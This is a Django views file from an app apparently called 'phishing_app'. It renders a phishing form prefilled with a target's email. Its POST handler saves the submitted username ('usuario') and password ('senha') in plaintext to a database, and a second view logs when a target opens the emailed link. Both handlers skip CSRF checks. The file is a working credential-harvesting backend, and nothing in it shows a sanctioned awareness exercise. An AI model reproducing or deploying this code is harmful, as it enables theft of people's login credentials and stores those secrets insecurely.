from django.http import JsonResponse
from django.shortcuts import render
from django.views import View
from datetime import datetime, timedelta

from django.views.decorators.csrf import csrf_exempt

from apps.phishing_app import models


class Phishing(View):
    def get(self, request):
        email = request.GET['email']
        context = {'email': email}
        return render(request, 'phishing_app/form_phishing.html', context)

    @csrf_exempt
    def post(self, request):
        usuario = request.POST['usuario']
        senha = request.POST['senha']
        email = request.POST['email']
        data = datetime.now() - timedelta(hours=3)

        objeto = models.Phishing(
            usuario=usuario,
            senha=senha,
            data_envio=data,
            email=email
        )

        objeto.save()

        return JsonResponse('deu bom', safe=False)

class Phishing_Enviados(View):

    @csrf_exempt
    def get(self, request):
        usuario = request.GET['email'].split('@')[0]
        data_envio = datetime.now() - timedelta(hours=3)

        objeto = models.Phishing_Enviados(
                    usuario=usuario,
                    data_envio=data_envio
                )
        objeto.save()

        return JsonResponse('deu bom', safe=False)